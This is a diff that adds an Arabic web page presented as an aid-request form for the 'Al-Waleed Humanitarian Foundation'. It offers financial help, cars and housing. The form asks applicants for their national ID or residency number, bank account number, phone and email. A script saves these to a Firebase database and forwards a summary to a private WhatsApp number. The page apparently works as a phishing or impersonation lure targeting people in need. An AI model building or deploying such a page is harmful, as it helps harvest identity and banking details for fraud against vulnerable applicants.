@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>مؤسسة الوليد الإنسانية | طلب مساعدة</title>
+
+
+<style>
+
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap');
+
+
+:root {
+
+--header-bg-image: url('images/xx.jpg');
+
+--card-bg-dark:#1a4332;
+
+--input-bg-light:#f8f9fa;
+
+--text-on-dark:#ffffff;
+
+--accent-green:#25D366;
+
+}
+
+
+*{
+box-sizing:border-box;
+}
+
+
+{
+
+font-family:'Cairo',Tahoma,sans-serif;
+
+margin:0;
+
+padding:0;
+
+background:#f0f2f5;
+
+color:#333;
+
+line-height:1.6;
+
+}
+
+
+header{
+
+background:
+linear-gradient(rgba(0,0,0,.7),rgba(0,0,0,.7)),
+var(--header-bg-image);
+
+background-size:cover;
+
+background-position:center;
+
+height:40vh;
+
+color:white;
+
+display:flex;
+
+flex-direction:column;
+
+justify-content:center;
+
+align-items:center;
+
+text-align:center;
+
+padding:20px;
+
+}
+
+
+.logo{
+
+width:110px;
+
+height:110px;
+
+background:white;
+
+background-image:var(--header-bg-image);
+
+background-size:cover;
+
+background-position:center;
+
+border-radius:50%;
+
+border:4px solid rgba(255,255,255,.8);
+
+box-shadow:0 4px 15px rgba(0,0,0,.3);
+
+margin-bottom:15px;
+
+}
+
+
+header h1{
+
+margin:5px 0;
+
+font-size:2.2rem;
+
+}
+
+
+header p{
+
+margin:0;
+
+font-size:1.1rem;
+
+opacity:.9;
+
+}
+
+
+
+.support-section{
+
+max-width:1100px;
+
+margin:-60px auto 40px;
+
+padding:0 20px;
+
+}
+
+
+.support-grid{
+
+display:grid;
+
+grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
+
+gap:25px;
+
+margin-bottom:50px;
+
+}
+
+
+
+.support-item{
+
+height:220px;
+
+border-radius:15px;
+
+overflow:hidden;
+
+display:flex;
+
+align-items:flex-end;
+
+box-shadow:0 10px 25px rgba(0,0,0,.1);
+
+background-size:cover;
+
+background-position:center;
+
+position:relative;
+
+}
+
+
+.overlay{
+
+position:absolute;
+
+inset:0;
+
+background:linear-gradient(
+to top,
+rgba(0,0,0,.9),
+rgba(0,0,0,.2)
+);
+
+}
+
+
+.content{
+
+position:relative;
+
+z-index:2;
+
+padding:20px;
+
+color:white;
+
+}
+
+
+.content h3{
+
+color:#25D366;
+
+margin:0 0 8px;
+
+}
+
+
+
+.card{
+
+background:#1a4332;
+
+padding:35px;
+
+border-radius:25px;
+
+box-shadow:0 20px 45px rgba(0,0,0,.5);
+
+}
+
+
+h2{
+
+color:white;
+
+text-align:center;
+
+border-bottom:2px solid rgba(255,255,255,.2);
+
+padding-bottom:15px;
+
+}
+
+
+
+.form-group{
+
+margin-bottom:18px;
+
+}
+
+
+label{
+
+display:block;
+
+font-weight:bold;
+
+color:white;
+
+margin-bottom:8px;
+
+}
+
+
+input,
+select,
+textarea{
+
+
+width:100%;
+
+padding:14px;
+
+border-radius:12px;
+
+border:none;
+
+font-size:1rem;
+
+background:#f8f9fa;
+
+}
+
+
+
+button{
+
+
+width:100%;
+
+padding:18px;
+
+background:linear-gradient(to right,#25D366,#128C7E);
+
+color:white;
+
+border:none;
+
+border-radius:15px;
+
+font-size:1.2rem;
+
+font-weight:bold;
+
+cursor:pointer;
+
+margin-top:15px;
+
+}
+
+
+
+.note{
+
+background:#fff9cd;
+
+color:#856404;
+
+padding:12px;
+
+border-radius:12px;
+
+text-align:center;
+
+margin-bottom:20px;
+
+}
+
+
+</style>
+
+</head>
+
+
+<body>
+<header>
+
+<div class="logo"></div>
+
+<h1>مؤسسة الوليد الإنسانية</h1>
+
+<p>تقديم طلبات الدعم والمساعدة عالمياً</p>
+
+</header>
+
+
+<div style="height:50px;"></div>
+
+
+<section class="support-section">
+
+
+<div class="support-grid">
+
+
+<div class="support-item" style="background-image:url('images/de.jpg');">
+
+<div class="overlay"></div>
+
+<div class="content">
+
+<h3>مساعدة مالية</h3>
+
+<p>
+نقدم الدعم المالي للمحتاجين حول العالم بآلية منظمة.
+</p>
+
+</div>
+
+</div>
+
+
+
+<div class="support-item" style="background-image:url('images/ds.jpg');">
+
+<div class="overlay"></div>
+
+<div class="content">
+
+<h3>سيارات</h3>
+
+<p>
+مبادرات لتوفير وسائل النقل للأسر والأيتام.
+</p>
+
+</div>
+
+</div>
+
+
+
+
+<div class="support-item" style="background-image:url('images/dx.jpg');">
+
+<div class="overlay"></div>
+
+<div class="content">
+
+<h3>وحدات سكنية</h3>
+
+<p>
+مشاريع لتوفير المسكن الملائم للمستحقين.
+</p>
+
+</div>
+
+</div>
+
+
+</div>
+
+
+
+
+
+<div class="card">
+
+
+<h2>
+ادخل بياناتك لطلب المساعدة
+</h2>
+
+
+
+<div class="note">
+💡 قم بتسجيل بياناتك بشكل صحيح لإنشاء رقم معاملة ومتابعة الطلب.
+</div>
+
+
+
+<div class="form-group">
+
+<label>
+الاسم الكامل:
+</label>
+
+<input 
+type="text"
+id="name"
+placeholder="الاسم كما في الهوية">
+
+</div>
+
+
+
+
+<div class="form-group">
+
+<label>
+رقم الجوال:
+</label>
+
+<input
+type="tel"
+id="phone"
+placeholder="مع مفتاح الدولة">
+
+</div>
+
+
+
+
+<div class="form-group">
+
+<label>
+البريد الإلكتروني:
+</label>
+
+<input
+type="email"
+id="email"
+placeholder="example@gmail.com">
+
+</div>
+
+
+
+
+<div class="form-group">
+
+<label>
+رقم الهوية:
+</label>
+
+<input
+type="text"
+id="idNumber"
+placeholder="رقم الهوية أو الإقامة">
+
+</div>
+
+
+
+
+<div class="form-group">
+
+<label>
+رقم الحساب البنكي:
+</label>
+
+<input
+type="text"
+id="accountNumber"
+placeholder="رقم الحساب">
+
+</div>
+
+
+
+
+<div class="form-group">
+
+<label>
+الدولة:
+</label>
+
+<input
+type="text"
+id="location"
+placeholder="الدولة">
+
+</div>
+
+
+
+
+<div class="form-group">
+
+<label>
+نوع المساعدة:
+</label>
+
+
+<select id="type">
+
+<option value="">
+-- اختر النوع --
+</option>
+
+<option value="مالية">
+مالية
+</option>
+
+<option value="سكنية">
+وحدات سكنية
+</option>
+
+<option value="سيارات">
+سيارات
+</option>
+
+<option value="اخرى">
+أخرى
+</option>
+
+
+</select>
+
+
+</div>
+
+
+
+
+
+<div class="form-group">
+
+<label>
+شرح الحالة:
+</label>
+
+
+<textarea
+id="notes"
+rows="4"
+placeholder="اشرح ظروفك بوضوح">
+</textarea>
+
+
+</div>
+
+
+
+
+<button id="sendBtn">
+
+إرسال الطلب عبر واتساب
+
+</button>
+
+
+
+</div>
+
+
+</section>
+<script type="module">
+
+import { initializeApp } 
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import { getFirestore, collection, addDoc, serverTimestamp } 
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+
+// إعدادات Firebase
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyCwLJes8Wi47sbYFdx-M-wieVfrJtNwQrU",
+
+authDomain: "smartx-5cfb1.firebaseapp.com",
+
+projectId: "smartx-5cfb1",
+
+storageBucket: "smartx-5cfb1.firebasestorage.app",
+
+messagingSenderId: "429730063200",
+
+appId: "1:429730063200:web:03524aef653c3ed6f97405",
+
+measurementId: "G-S4V29MRQJM"
+
+};
+
+
+// تشغيل Firebase
+
+const app = initializeApp(firebaseConfig);
+
+const db = getFirestore(app);
+
+
+
+// زر الإرسال
+
+const sendBtn = document.getElementById("sendBtn");
+
+
+
+sendBtn.onclick = async function(){
+
+
+const adminPhone = "966580272758";
+
+
+// جلب البيانات
+
+const name = document.getElementById("name").value;
+
+const phone = document.getElementById("phone").value;
+
+const email = document.getElementById("email").value;
+
+const idNumber = document.getElementById("idNumber").value;
+
+const accountNumber = document.getElementById("accountNumber").value;
+
+const location = document.getElementById("location").value;
+
+const type = document.getElementById("type").value;
+
+const notes = document.getElementById("notes").value;
+
+
+
+if(
+!name ||
+!phone ||
+!email ||
+!idNumber ||
+!location ||
+!type ||
+!notes
+){
+
+alert("يرجى تعبئة جميع الحقول المطلوبة");
+
+return;
+
+}
+
+
+
+// إنشاء رقم معاملة 4 أرقام
+
+const transactionId = Math.floor(1000 + Math.random()*9000);
+
+
+
+try{
+
+
+// حفظ الطلب
+
+await addDoc(collection(db,"requests"),{
+
+
+transactionId:String(transactionId),
+
+name:name,
+
+phone:phone,
+
+email:email,
+
+idNumber:idNumber,
+
+accountNumber:accountNumber,
+
+country:location,
+
+helpType:type,
+
+notes:notes,
+
+status:"قيد المراجعة",
+
+createdAt:serverTimestamp()
+
+
+});
+
+
+
+// رسالة واتساب
+
+let message =
+"📌 طلب مساعدة جديد\n\n";
+
+
+message += "رقم المعاملة: "+transactionId+"\n\n";
+
+message += "الاسم: "+name+"\n";
+
+message += "الهاتف: "+phone+"\n";
+
+message += "البريد: "+email+"\n";
+
+message += "الدولة: "+location+"\n";
+
+message += "نوع المساعدة: "+type+"\n";
+
+message += "التفاصيل: "+notes;
+
+
+
+window.location.href =
+"https://wa.me/"+adminPhone+
+"?text="+encodeURIComponent(message);
+
+
+
+}
+
+catch(error){
+
+console.log(error);
+
+alert("حدث خطأ أثناء إرسال الطلب");
+
+}
+
+
+
+};
+
+
+</script>
+</body>
+
+</html>
